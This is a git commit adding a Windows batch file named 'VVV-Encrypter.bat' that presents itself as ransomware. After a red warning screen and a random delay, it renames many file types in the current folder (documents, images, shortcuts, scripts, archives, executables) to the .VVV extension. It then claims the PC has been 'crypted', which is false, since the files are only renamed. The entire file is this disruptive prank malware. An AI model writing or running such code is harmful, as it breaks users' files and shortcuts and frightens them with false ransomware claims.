e23263800c241e70f0123f6ad8c30f288e8327b1
Microshaft <41166367+MicroshaftCorp@users.noreply.github.com>
2018-07-14 07:21:05 -0700

    Create VVV-Encrypter.bat

---
+++ VVV-Encrypter.bat
@@ -0,0 +1,26 @@
+@echo off
+color 47
+md VVV-Crypter-Keep Files
+title Warning!
+echo [^] Oooops,Your Files Turned Into Ransomware!
+echo If You Did Not Ask For This,Please Close The Window.
+echo Then Open VVV-Decrypter.bat
+timeout %random%
+pause
+REN *.DOC *.VVV
+REN *.JPEG *.VVV
+REN *.LNK *.VVV
+REN *.AVI *.VVV
+REN *.MPEG *.VVV
+REN *.COM *.VVV
+REN *.BAT *.VVV
+REN *.HTML *.VVV
+REN *.SB2 *.VVV
+REN *.TXT *.VVV
+REN *.ZIP *.VVV
+REN *.PNG *.VVV
+REN *.VBS *.VVV
+REN *.JAVA *.VVV
+REN *.JS *.VVV
+cls
+echo Your PC Has Glady Been Crypted.
